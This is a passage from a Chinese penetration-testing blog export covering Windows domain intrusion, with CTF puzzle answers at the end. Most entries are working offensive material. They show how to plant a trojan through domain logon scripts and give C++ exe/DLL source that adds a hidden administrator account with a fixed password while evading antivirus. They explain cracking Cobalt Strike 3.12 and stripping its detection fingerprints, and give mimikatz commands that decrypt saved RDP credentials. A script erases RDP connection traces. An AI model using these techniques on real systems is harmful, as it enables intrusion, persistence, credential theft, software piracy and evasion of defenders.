'' logontype = '' logonaddr = '' skip = 0 elif eachline.find('Date:') &gt; -1: date = eachline[(eachline.find(':')+1):].strip() elif eachline.find('Task:') &gt; -1: task = eachline.split(':')[1].strip() if (date == lastdate) and (task == lasttask): ## reduce skip = 1 else: lastdate = date lasttask = task elif eachline.find('Account Name:') &gt; -1: accname = eachline.split(':')[1].strip() if (task == 'Logon') and (accname.find('$') &gt; -1): ## reduce skip = 1 elif eachline.find('Account Domain:') &gt; -1: accdomain = eachline.split(':')[1].strip() elif eachline.find('Source Network Address:') &gt; -1: logonaddr = eachline[(eachline.find(':')+1):].strip() if logonaddr == '-': skip = 1 if (skip == 0) and (task == 'Logon'): LogonStat = [[task, date, accname, accdomain, logonaddr]] csv_write.writerows(LogonStat)except Exception as e: # pass print 'Error: %s' % e sys.exit(1)fevt.close()csvfile.close() PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。123wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='10'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=4624) and TimeCreated[timediff(@SystemTime) &amp;lt;= 2592000000]]]"wevtutil qe Security /q:"*[System[(Keywords='0x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /rd:true /c:2 0x03 【参考】wevtutil筛选windows日志查询结果[Tools]获取域环境内所有用户登录信息（附源码及程序）域内用户在域内的机器ip怎么查呢？https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[摘要：采取直接的手段不能够解决问题，只好曲线救国。声明：只是作为搬运工。 0x00 利用场景 利用前置条件 1域管理员权限 使用场合 12知道目标域用户名称，探测不到域用户对应机器名或IP；知道目标机器IP，但是无法通往上控； 0x01 利用方法PS：以下测试全部在域控上执行 一）使用dsmod给指定域用户设置登陆脚本test.bat放在域控的NETLOGON目录下面12copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batdsmod user -loscr &quot;test.bat&quot; &quot;CN=x,OU=x,DC=x,DC=x,DC=x&quot; 测试结果：PS: 测试机为Win-XP x86，第二次注销重新登陆bat脚本才执行，bat内容为`@calc.exe`。 二）登陆脚本给指定用户种马test.bat放在域控的NETLOGON目录下面123copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.batnet user xp /scriptpath:test.bat # 内网域成员机器可以使用gpupdate /force # 立即刷新组策略 使用域管权限执行 不执行也行,等待随机 测试结果与第一种方法一致 三）使用PowerShell的Active Directory模块ActiveDirectory.psd1项目：ADModule命令：12Import-Module ActiveDirectory.psd1; 或者Import-Module Microsoft.ActiveDirectory.Management.dllSet-ADUser -Identity AD_USER -ProfilePath &quot;filepath&quot; -ScriptPath &quot;filename&quot; 参数说明 Identity通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为： 1234一个名字GUID（objectGUID）安全标识符（objectSid）SAM帐户名称（sAMAccountName） ProfilePath指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 ScriptPath指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。 测试结果与第一种方法一致 0x02 参考http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/https://www.t00ls.net/thread-48540-1-1.htmlhttps://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.htmlhttps://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【C++】创建用户，并添加至管理组]]></title>
    <url>%2F2018%2F11%2F%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84%2F</url>
    <content type="text"><![CDATA[摘要: 因有些需求，需要本地/远程添加用户。所以直接选择Windows API函数进行编写，因为部分杀软限制了CMD。123456程序名称：添加系统用户.exe(也可创建dll)编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64编写语言：C++ (C#存在版本限制)测试条件：以管理员运行测试工具：zzz_exploit or other测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加 0x00 思路及原理一）编程思路使用NetUserAdd函数添加普通权限的用户并指定级别。123456NET_API_STATUS NET_API_FUNCTION NetUserAdd( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。 LPDWORD parm_err); 使用NetLocalGroupAddMembers函数将现有用户账号添加到现有本地组。1234567NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 LPCWSTR groupname, // 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。 DWORD totalentries // 指定buf参数指向的缓冲区中的条目数。); 二）编写思路 定义USER_INFO_1 结构体该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。 调用NetUserAdd添加普通权限账户 调用NetLocalGroupAddMembers添加到管理员组 0x01 代码一）exe生成123456789101112131415161718192021222324252627282930313233343536373839// UserInfoAdd.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[])&#123; // 定义USER_INFO_1结构体 USER_INFO_1 UserInfo; DWORD dwLevel = 1; DWORD dwError = 0; UserInfo.usri1_name = L"Admins"; // 账户 UserInfo.usri1_password = L"P@ssword233"; // 密码 UserInfo.usri1_priv = USER_PRIV_USER; UserInfo.usri1_home_dir = NULL; UserInfo.usri1_comment = NULL; UserInfo.usri1_flags = UF_SCRIPT; UserInfo.usri1_script_path = NULL; //添加名为Admins的用户,密码为P@ssword233 NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError); // 添加用户到administrators组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = UserInfo.usri1_name; NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1); return 0;&#125; 二）dll生成1234567891011121314151617181920212223242526272829#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,&quot;netapi32&quot;)#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt; #include &lt;iostream&gt;#include &lt;lm.h&gt;#include &lt;stdlib.h&gt;#include &lt;atlimage.h&gt;int NetUserAdd()&#123; ....&#125;BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: NetUserAdd(); break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在编译代码的时候，选择MT，所有的依赖文件都会编进去。 0x02 备注123456支持最低客户端: Windows 2000 Professional [仅desktop apps]支持最低服务器: Windows 2000 Server [仅desktop apps]目标平台: WindowsHeader: lmaccess.h (include Lm.h)Library: Netapi32.libDLL: Netapi32.dll]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike 3.12 破解]]></title>
    <url>%2F2018%2F10%2FCobaltStrike-3-12-%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[听说有更新，所以就拿来看看，按照3.8的破解流程。 0x00 Cobalt Strike3.12 下载原版：https://github.com/microidz/Cobaltstrike-Trial 校验：https://verify.cobaltstrike.com/ xor.bin：https://github.com/verctor/CS_xor64 破解记录 0x01 文件文件位置1234567common/License.class # 修改时间及提示框common/ArtifactUtils.class # 去除后门特征指纹server/ProfileEdits.class # 去除后门特征指纹aggressor/dialogs/ListenerDialog.class # 去除listener个数限制aggressor/AggressorClient.class # 标题栏修改resources/xor.bin # 放入xor.bin文件resources/xor64.bin # 放入xor.bin文件 0x02 License.class首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行jad.exe License.class，jad目录下就会生成License.jad，修改后缀为Java，即是源码文件了。 这里将提供两种破解思路。 (1) 直接修改试用时间 123private static long life = 21L;将21天的试用期修改成private static long life = 99999L; (2) 修改isTrail的判断逻辑 123456789 public static boolean isTrial() &#123; return true; &#125;修改成 public static boolean isTrial() &#123; return false; &#125; 往下：12345678910public static void checkLicenseGUI(Authorization auth)&#123; ....&#125;修改成public static void checkLicenseGUI(Authorization authorization)&#123;&#125;同理public static void checkLicenseConsole(Authorization authorization) 0x03 去除listener个数限制文件在aggressor/dialogs/ListenerDialog.class 去除1234if(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal))) &#123; DialogUtils.showError("You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."); &#125; else 0x04 后门特征指纹存在后门特征指纹的其中两个地方 common/ArtifactUtils.class1packer.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); server/ProfileEdits.class12345c2profile.addCommand(".http-get.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-post.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-stager.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x86", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x64", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); 0x05 结果最后使用1javac -classpath cobaltstrike.jar xxxx.java 进行编译 0x06 参考https://xz.aliyun.com/t/2170https://www.cnblogs.com/ssooking/p/9825917.htmlhttps://www.bilibili.com/video/av34171888/https://github.com/Lz1y/cobalt_strike_3.12_patch]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】批量 Net User Uname /domain]]></title>
    <url>%2F2018%2F08%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91-%E6%89%B9%E9%87%8FNet-User%2F</url>
    <content type="text"><![CDATA[域内批量执行 net user Uname /domain 0x00使用场景在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。查找域用户对应的 Full Name 信息，从而确认目标任务对应的域用户。 0x01 代码代码其实很简单，使用 C# 进行编写，可自行编译。 将所有域用户导入user.txt中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行net user Uname /domain，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182using System;using System.IO;using System.Text;using System.Text.RegularExpressions;namespace domain&#123; class Program &#123; static void Main(string[] args) &#123; Console.WriteLine(&quot;Tools By RcoIl \r&quot;); string currentDirectory = Environment.CurrentDirectory; string text = currentDirectory + &quot;\\user.txt&quot;; // 文件绝对路径 if (!File.Exists(text)) &#123; Console.WriteLine(&quot;File not found &quot; + text); &#125; else &#123; FileStream stream = new FileStream(text, FileMode.Open, FileAccess.Read); // 打开文本 try &#123; StreamReader streamReader = new StreamReader(stream, Encoding.Default); // 实例化 try &#123; while (!streamReader.EndOfStream) // 读取文本 &#123; string text2; if ((text2 = streamReader.ReadLine()) != null &amp;&amp; text2.Length != 0) &#123; string id = text2; Program.Check(id); &#125; &#125; &#125; finally &#123; if (streamReader != null) &#123; ((IDisposable)streamReader).Dispose(); &#125; &#125; &#125; finally &#123; if (stream != null) &#123; ((IDisposable)stream).Dispose(); &#125; &#125; Console.WriteLine(&quot;============================================================&quot;); Console.WriteLine(&quot;Finish!&quot;); GC.Collect(); &#125; &#125; public static void Check(string id) &#123; System.Diagnostics.ProcessStartInfo proccessStartInfo = new System.Diagnostics.ProcessStartInfo(&quot;net&quot;, &quot;user &quot; + id + &quot; /domain&quot;); proccessStartInfo.CreateNoWindow = true; System.Diagnostics.Process proc = new System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;; proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息 proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动 proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口 proc.Start(); // 启动程序 string outlist = proc.StandardOutput.ReadToEnd(); // 获取cmd窗口的输出信息 Regex reg = new Regex(&quot;.*ame.*&quot;); MatchCollection result = reg.Matches(outlist); Console.WriteLine(&quot;============================================================&quot;); foreach (Match match in result) &#123; Console.WriteLine(match); &#125; proc.WaitForExit(); // 等待程序执行完退出进程 proc.Close(); &#125; &#125;&#125; 运行效果图： 0x02 改进 (20190418)由于上面的代码略蠢，所以我决定将它进行改进。 使用 System.DirectoryServices.ActiveDirectory 列举用户； 使用 msvcrt.dll 执行系统命令； ​ 1) powershell 列举用户列表这份代码在网上已经很成熟了，可自行查阅。 12345678910111213141516171819202122232425262728293031323334353637function DomainUserList&#123; # 获取当前 Domain 值 $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain) $DirEntry = New-Object System.DirectoryServices.DirectoryEntry $UserSearcher.SearchRoot = $DirEntry $lockoutThreshold = [int]$DirEntry.lockoutThreshold.Value Write-Host -ForegroundColor "yellow" "[*] 当前域的锁定阈值是 $($lockoutThreshold)." $minPwdLength = [int]$DirEntry.minPwdLength.Value Write-Host -ForegroundColor "yellow" "[*] 当前域的最小密码长度是 $($minPwdLength)." # 删除已禁用的用户列表 if ($RemoveDisabled) &#123; # 参考资料：http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/ Write-Host -ForegroundColor "yellow" "[*] 从列表中删除已禁用的用户." $UserSearcher.filter = "(&amp;(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2))" &#125; else &#123; $UserSearcher.filter = "(&amp;(objectCategory=person)(objectClass=user))" &#125; # 在结果中抓取1000次 $UserSearcher.PageSize = 100 $AllUserObjects = $UserSearcher.FindAll() Write-Host -foregroundcolor "yellow" ("[*] 从当前 AD 域中成功收集了 " + $AllUserObjects.count + " 个用户") return $AllUserObjects.Properties.samaccountname&#125;DomainUserList 将代码转换成C#代码，效果如下 3) 成品其实还是有点麻瓜。 github: DomainUserList 0x03 总结在域内使用dsquery查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Tools</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于windows的RDP连接记录]]></title>
    <url>%2F2018%2F05%2F%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[关于windows的RDP连接历史记录处理，此处仅作为笔记记录，并非原创。 0x00 前言每次成功连接到远程主机时，RDP客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动mstsc.exe时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。 从安全角度来讲，这是极不安全的。 0x01 获取RDP连接历史记录至于获得历史记录的思路及细节实现思路，请转至三好学生师傅的博客，此处仅作为记录。 1234567891011121314151617181920212223242526272829303132333435363738&lt;#.SYNOPSISThis script will list the logged-in users' RDP Connections History.Author: 3gstudent@3gstudentLicense: BSD 3-Clause#&gt;$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser)&#123; $RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\" Write-Host "User:"$User.Name Write-Host "SID:"$User.SID Write-Host "Status:"$User.Status Try &#123; $QueryPath = dir $RegPath -Name -ErrorAction Stop &#125; Catch &#123; Write-Host "No RDP Connections History" Write-Host "----------------------------------" continue &#125; foreach($Name in $QueryPath) &#123; Try &#123; $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host "User:"$User Write-Host "Server:"$Name &#125; Catch &#123; Write-Host "No RDP Connections History" &#125; &#125; Write-Host "----------------------------------" &#125; 根据三好学生师傅的PowerShell改写了C#版本，虽然代码不怎么好看。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798using System;using Microsoft.Win32;namespace SavedRDPConnections&#123; class Program &#123; public static string GetRegValue(string hive, string path, string value) &#123; string regKeyValue = &quot;&quot;; if (hive == &quot;HKCU&quot;) &#123; var regKey = Registry.CurrentUser.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value)); &#125; return regKeyValue; &#125; else if (hive == &quot;HKU&quot;) &#123; var regKey = Registry.Users.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value)); &#125; return regKeyValue; &#125; else &#123; var regKey = Registry.LocalMachine.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format(&quot;&#123;0&#125;&quot;, regKey.GetValue(value)); &#125; return regKeyValue; &#125; &#125; public static string[] GetRegSubkeys(string hive, string path) &#123; try &#123; Microsoft.Win32.RegistryKey myKey = null; if (hive == &quot;HKLM&quot;) &#123; myKey = Registry.LocalMachine.OpenSubKey(path); &#125; else if (hive == &quot;HKU&quot;) &#123; myKey = Registry.Users.OpenSubKey(path); &#125; else &#123; myKey = Registry.CurrentUser.OpenSubKey(path); &#125; String[] subkeyNames = myKey.GetSubKeyNames(); return myKey.GetSubKeyNames(); &#125; catch &#123; return new string[0]; &#125; &#125; public static void ListSavedRDPConnections() &#123; string[] SIDs = Registry.Users.GetSubKeyNames(); foreach (string SID in SIDs) &#123; if (SID.StartsWith(&quot;S-1-5&quot;) &amp;&amp; !SID.EndsWith(&quot;_Classes&quot;)) &#123; string[] subkeys = GetRegSubkeys(&quot;HKU&quot;, String.Format(&quot;&#123;0&#125;\\Software\\Microsoft\\Terminal Server Client\\Servers&quot;, SID)); if (subkeys != null) &#123; Console.WriteLine(&quot;\r\n\r\n=== Saved RDP Connection Information (&#123;0&#125;) ===&quot;, SID); foreach (string host in subkeys) &#123; string username = GetRegValue(&quot;HKCU&quot;, String.Format(&quot;Software\\Microsoft\\Terminal Server Client\\Servers\\&#123;0&#125;&quot;, host), &quot;UsernameHint&quot;); Console.WriteLine(&quot;\r\n Server : &#123;0&#125;&quot;, host); if (username != &quot;&quot;) &#123; Console.WriteLine(&quot; User : &#123;0&#125;&quot;, username); &#125; &#125; &#125; &#125; &#125; &#125; static void Main(string[] args) &#123; ListSavedRDPConnections(); &#125; &#125;&#125; 0x02 破解RDP连接凭证破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。 1、查找本地的Credentials1dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* 2、使用mimikatz进行操作1mimikatz dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 得到的内容为： 123456789101112131415161718192021222324mimikatz # dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6**BLOB** dwVersion : 00000001 - 1 guidProvider : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125; dwMasterKeyVersion : 00000001 - 1 guidMasterKey : &#123;ffc994a1-de8d-4304-9416-31e587f7a8ca&#125; dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530 dwDataLen : 000000b0 - 176 pbData : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a dwSignLen : 00000040 - 64 pbSign : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8 接下来需要使用的就是guidMasterKey、pbData数据。pbData是凭据的加密数据，guidMasterKey是凭据的GUID 3、使用sekurlsa::dpapi 根据目标凭据GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。 4、解密命令为： 1dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c 0x03 清除RDP连接历史记录清除就相对简单一些。 1HKCU:\Software\Microsoft\Terminal Server Client\ 针对上述的Default、Server，对其表项进行删除 tips：由于在删除Server表项的时候无法一次选择所有表项，因为可以直接删除整个Server再新建。 除了删除注册表之外，要需要删除默认的RDP连接文件 1234567@echo offreg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f # 删除Default中的所有值reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /f # 删除整个Serversreg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项cd %userprofile%\documents\ # 转到Default.rdp文件目录attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏del Default.rdp # 删除文件Default.rdp文件 注意：在某些情况（比如系统盘空间不足）下，Document文件夹会从%userprofile%\documents\移动，所以特殊情况下，需要手动查找Default.rdp 0x04参考获得Windows系统的远程桌面连接历史记录 mimikatz获取本地Credentials 破解远程终端凭据，获取服务器密码 How to Clear RDP Connections History in Windows]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全,内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ISCC-2018]]></title>
    <url>%2F2018%2F05%2FISCC-2018%2F</url>
    <content type="text"><![CDATA[又一年，不过今年的质量有些….. 0x01MiscWhat is that？附件地址：What is that 查看图片信息，使用传统的方法解答没见效，使用TweakPNG查看图片信息。 将高度调整即可得到flag。 秘密电报查看附件，内容为： 12秘密电报：知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA 老司机一看就是培根密码了，flag为：ILIKEISCC Where is the FLAG？附件地址：Where is the FLAG 题目：不只是Logo 查看详细信息，发现是由Adobe Fireworks CS5保存出来的图片，那就用Adobe Fireworks CS5打开。 调整画布大小，开始摆，得出一张二维码。flag{a332b700-3621-11e7-a53b-6807154a58cf} 一只猫的心思附件地址：一只猫的心思 题目：你能读懂它的心思吗？ 使用foremost抽离图片，得到一个doc文件，打开，内容为： 1名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通 到与佛论禅进行解密，得到一串16进制字符串，接下来： 116进制--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本 得到F1a9_is_I5cc_ZOl8_G3TP01NT 暴力XX不可取附件地址：暴力XX不可取 题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？ 下载附件直接能解压，flag.txt的内容为vfppjrnerpbzvat，凯撒解密得出flag为：isccwearecoming 重重谍影题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。 1Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjV